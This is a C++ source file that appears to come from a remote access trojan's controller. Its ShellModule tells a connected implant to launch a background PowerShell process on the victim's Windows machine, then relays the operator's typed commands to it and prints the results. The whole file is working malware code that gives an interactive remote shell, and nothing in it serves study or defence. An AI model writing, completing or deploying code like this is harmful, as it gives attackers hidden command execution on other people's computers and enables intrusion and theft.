#include <modules.hpp>

Module::Module(){}

ShellModule::ShellModule(){}
ShellModule& ShellModule::getInstance() {
    static ShellModule instance;
    return instance;
}

void ShellModule::execute(const SocketHandle& sock) {
    if (sock == INVALID_SOCKET_HANDLE) {
        std::cerr << "[-] Module Socket target is not Valid!" << "\n";
        return;
    }

    std::cout << "[*] Starting up Shell Module. . ." << std::endl;
    // tell the connected rat to create/hook into a background powershell process
    std::string victProcCmd = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    if (RatPacketUtils::Send(sock, RatPacket(victProcCmd, MsgType::INVOKE))) {
        std::string input = "";
        while (input != "exit") {
            auto recvPacket = RatPacketUtils::Recv(sock);
            if (recvPacket.second) {
                std::string output = recvPacket.first.GetPacketMessage();
                std::cout << output;
            }

            // allows for empty input
            std::getline(std::cin, input);

            if (!RatPacketUtils::Send(sock, RatPacket(input, MsgType::EXEC))) {
                std::cout << "[-] Error sending command!" << std::endl;
                break;
            }
        }
    }
    // kill powershell background process
    std::cout << "[*] Closing Shell Module. . ." << std::endl;
}